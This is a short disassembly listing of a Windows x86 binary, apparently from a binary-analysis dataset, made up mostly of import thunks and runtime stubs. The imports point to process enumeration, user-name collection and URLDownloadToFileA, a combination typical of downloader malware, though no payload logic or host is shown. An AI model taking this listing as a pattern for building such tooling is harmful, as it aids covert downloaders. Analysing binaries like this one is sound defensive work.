pop ecx
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
strlen
jmp [ strlen@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strcat
jmp [ strcat@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_403210
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_403381
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40339a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4033ac
xor eax eax
retn
sub_4033af
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
GetUserNameExA
jmp [ GetUserNameExA@IAT ]
sub_4033c8
lea ecx [ ebp - 0x60 ]
jmp sub_4011c8
sub_4033d0
mov eax r--data
jmp __CxxFrameHandler
sub_4033dc
lea ecx [ ebp - 0x50 ]
jmp sub_4011c8
sub_4033e4
mov eax r--data
jmp __CxxFrameHandler
